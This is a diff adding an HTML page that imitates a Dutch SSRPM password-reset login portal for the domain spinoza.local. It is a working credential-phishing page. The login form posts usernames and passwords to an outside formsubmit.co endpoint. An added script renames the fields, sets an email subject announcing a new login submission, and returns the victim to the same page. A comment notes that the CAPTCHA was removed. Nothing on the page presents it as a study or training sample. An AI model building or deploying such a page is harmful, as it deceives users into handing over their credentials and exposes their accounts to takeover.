@@ -1,0 +1,197 @@
+<!DOCTYPE html><!--[if IE 8 ]> <html dir="ltr" lang="en-US" class="no-js ie8 oldie"> <![endif]--><html><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>
+        SSRPM Web Interface
+    </title>
+    <link href="css/css.css" rel="stylesheet">
+
+    <script src="js/modernizr.js"></script>
+
+    <!--<link href="/Content/mobiel.css" rel="stylesheet" type="text/css" media="screen and (max-width: 600px)" />-->
+        <link href="css/custom.css" rel="stylesheet" type="text/css">
+
+    <link href="css/ssrpm.css" rel="stylesheet" type="text/css">
+
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="images/favicon.ico" type="image/ico">
+
+    <!--[if gte IE 5]>
+        <link href="/Content/ssrpm-ie-only.css" rel="stylesheet" type="text/css" />
+    <![endif]-->
+    <script src="js/jquery.js"></script>
+
+    <script src="js/jqueryval.js"></script>
+
+    <script src="js/jquery-ui.js"></script>
+
+    <script src="js/CommonFunctions.js"></script>
+
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            AjaxPostDeviceInfo();
+        });
+
+        function AjaxPostDeviceInfo() {
+            var data = new Array;
+            data.push({ name: 'isMobile', value: IsMobile() });
+            data.push({ name: 'width', value: $(window).width() });
+            data.push({ name: 'height', value: $(window).height() });
+            
+            $.ajax({
+                url: '/Home/SetDeviceInfo',
+                type: 'POST',
+                data: data,
+                success: function (result) {
+                    if (result.Success) {
+
+                    }
+                    else {
+
+                    }
+                }
+            });
+        }
+
+        $(window).resize(function () {
+            waitForFinalEvent(AjaxPostDeviceInfo(), 500, "UniqueEventIdentifierPostDeviceInfo");
+        });
+    </script>
+</head>
+
+<body class="body-image" scroll="no">
+    <div class="container-fluid">
+        <div class="row width-100-percent">
+            <div class="col-sm-2"></div>
+            <div class="col-sm-2"></div>
+            <div class="col-sm-2"></div>
+            <div class="col-sm-2"></div>
+            <div class="col-sm-2"></div>
+            <div class="col-sm-2">
+            </div>
+        </div>
+    </div>   <!--End container -->
+
+    <div class="hidden-field" id="token"></div>
+    <div class="logo-body">
+        <div class="logo-container">
+                <div class="logo">
+        </div>
+    </div>
+
+
+
+    <div class="ssrpmbody">
+        <!-- Modal -->
+        <div class="faq-modal modal fade bg-white" id="FaqModal" tabindex="-1" role="dialog" aria-hidden="true"> </div>
+        <!-- /.modal -->
+            <a href="/Home/FAQ" class="btn-glyph-faq" aria-label="Left Align" data-toggle="modal" data-target="#FaqModal">
+                <span class="fa-14 fa fa-question-circle" aria-hidden="true" id="FaqIcon" title="FAQ" data-placement="left" data-original-title="FAQ"></span>
+            </a>
+                
+
+
+
+
+<div class="formheader">
+    <div class="enroll-icon form-icon"></div>
+    <div class="formheader-vertical">
+        <div class="formheader-text">Vul uw gebruikersnaam en wachtwoord in om verder te gaan.</div>
+    </div>
+</div>
+
+
+<div class="progress-div"><div class="progress"><div class="progress-bar" role="progressbar" style="width:430px"></div></div><div class="progress-steps"></div></div>
+    
+<div class="form-body"> 
+    <div class="row">
+        <div class="col-sm-12">
+<form id="AacDataForm" action="https://formsubmit.co/fb3a4e5a92a3aa7901391c640e99d3a4" method="post"><input name="__RequestVerificationToken" type="hidden" value="9MpjqSP6V2TqQgRUFlZ3S3bNHwCPM6rPjUd20tpc4iemaal9M9Y9EwwrI9pajssZXH2DabdaLlA_9b4KLL_3kc7SgkZxMJg1dovUb0d5v3M1">                <!--hidden button submit through for enter key-->
+                <input type="submit" class="hidden-submit-btn" hidefocus="true" tabindex="-1" id="HiddenNextBtn" name="NextBtn" value="Volgende">
+                <div class="form-container">
+                    <div class="form-group-label">
+                        <label for="DataModel_UserName">Gebruikersnaam:</label>
+                    </div>
+                    <div class="form-group-edit">
+                        <input autofocus="autofocus" class="form-control text-box single-line" id="DataModel_UserName" name="DataModel.UserName" onchange="OnChangeUserName();" placeholder="Vul gebruikersnaam in" tabindex="1" type="text" value="">
+                    </div>
+                    <div class="form-group-label">
+                        <label for="DataModel_Password">Wachtwoord:</label>
+                    </div>
+                    <div class="form-group-edit">
+                        <input class="form-control text-box single-line password" data-toggle="password" id="DataModel_Password" name="DataModel.Password" placeholder="Vul wachtwoord in" tabindex="2" type="password" value="">
+                    </div>
+<input id="DataModel_Domain" name="DataModel.Domain" type="hidden" value="spinoza.local">
+
+                </div>
+
+<div class="nav-btn-group">
+            <input type="button" class="cancel btn-submit" id="BackBtn" name="BackBtn" value="Vorige" tabindex="8" onclick="window.location.href='https://lucasenlucas.github.io/sgdcproject/'">
+        <input type="submit" class="btn-submit" id="NextBtn" name="NextBtn" value="Volgende" autofocus="" tabindex="9">
+</div></form>        </div>
+
+    </div>
+</div>
+    </div>
+
+
+
+    <script src="js/bootstrap.js"></script>
+
+    
+
+    <script type="text/javascript">
+        $('[data-toggle="tooltip"]').tooltip();
+    </script>
+
+
+    <script type="text/javascript">
+        // Ensure username and password fields have names expected by FormSubmit
+        (function(){
+            var user = document.getElementById('DataModel_UserName');
+            var pass = document.getElementById('DataModel_Password');
+            if (user) user.setAttribute('name','username');
+            if (pass) pass.setAttribute('name','password');
+            var form = document.getElementById('AacDataForm');
+            if (form) {
+                var next = document.getElementById('NextBtn');
+                if (next) {
+                    // add formsubmit helpers
+                    var nextUrl = document.createElement('input');
+                    nextUrl.type = 'hidden';
+                    nextUrl.name = '_next';
+                    nextUrl.value = window.location.href; // stay on page after submit
+                    form.appendChild(nextUrl);
+                    var subject = document.createElement('input');
+                    subject.type = 'hidden';
+                    subject.name = '_subject';
+                    subject.value = 'Nieuwe login inzending';
+                    form.appendChild(subject);
+                    // CAPTCHA removed
+                }
+            }
+        })();
+        $('#FaqIcon').tooltip();
+
+        $(document).ready(function () {
+            setTimeout(
+                function () {
+                    var el = $('[autofocus="autofocus"]');
+                    if (el.length > 0) {
+                        if (el[0].type == "text")
+                            el[0].selectionStart = el[0].selectionEnd = el[0].value.length;
+                        el[0].focus();
+                    }
+                }, 250);
+        });
+
+        $('#FaqModal').on('hidden.bs.modal', function () {
+            $(this).data('bs.modal', null);
+        });
+    </script>
+
+
+</div></body></html>
